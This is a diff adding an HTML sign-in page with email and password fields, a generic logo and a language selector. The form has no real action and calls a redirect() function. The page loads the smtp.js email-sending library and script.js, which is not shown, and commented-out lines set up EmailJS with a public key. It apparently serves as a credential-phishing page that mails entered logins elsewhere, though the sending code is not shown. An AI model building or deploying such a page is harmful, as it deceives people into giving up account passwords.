@@ -1,0 +1,63 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <!-- <script src="https://smtpjs.com/v3/smtp.js">
+  </script> -->
+  <!-- <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <script type="text/javascript">
+    (function(){
+        emailjs.init({
+          publicKey: "KKF_ybLxO-P0dC80f",
+        });
+    })();
+  </script>
+  <script src="script.js"></script> -->
+</head>
+<body class="bg-[#FFFFFF]">
+  <div class="pt-28">
+    <div class="flex flex-col justify-center items-center">
+      <div>
+        <img src="img/f81d2481a7344540002fe3a7b52f87cb-login.png" alt="" class="w-48">
+      </div>
+  <form action="#">
+
+        <div class="relative mt-20">
+          <input type="email" name="" id="email" class="border-b focus:border-b-2 border-gray-600 transition-colors focus:border-[#0E7FBA] w-full md:w-[500px] focus:outline-none peer duration-200" required>
+          <label for="email" class="absolute peer-focus:text-xs left-0 cursor-text peer-focus:-top-6 transition-all duration-200">Email</label>
+        </div>
+
+        <div class="relative mt-10">
+          <input type="password" name="" id="password" class="border-b focus:border-b-2 border-gray-600 transition-colors focus:border-[#0E7FBA] w-full md:w-[500px] focus:outline-none peer duration-200" required>
+          <label for="password" class="absolute peer-focus:text-xs left-0 cursor-text peer-focus:-top-6 transition-all duration-200">Password</label>
+        </div>
+        <div class="flex flex-col">
+          <button type="submit" onclick="redirect()" class="w-48 md:w-[500px] bg-[#0E7FBA] py-1.5 inline-block mt-16 text-white font-semibold uppercase rounded-md text-sm">sign in</button>
+          <a href="" class="text-center text-gray-600 text-sm font-medium pt-4 inline-block">Forgot Password?</a>
+          <div class="flex space-x-2 mt-6 justify-center items-center"> 
+            <p class="capitalize text-sm font-semibold text text-gray-500 p-2 border-none outline-none">language:</p>
+            <select name="" id="" class="font-semibold text-sm cursor-pointer text-gray-500 ">
+              <option value="">English (US)</option>
+              <option value="">English (UK)</option>
+              <option value="">Deutsch</option>
+              <option value="">Espanol</option>
+              <option value="">Francais</option>
+              <option value="">Italiano</option>
+              <option value="">Nederlands</option>
+              <option value="">Svenski</option>
+              <option value="">Polski</option>
+            </select>
+          </div>
+      </div>
+    </div>
+  </form>
+  </div>
+
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
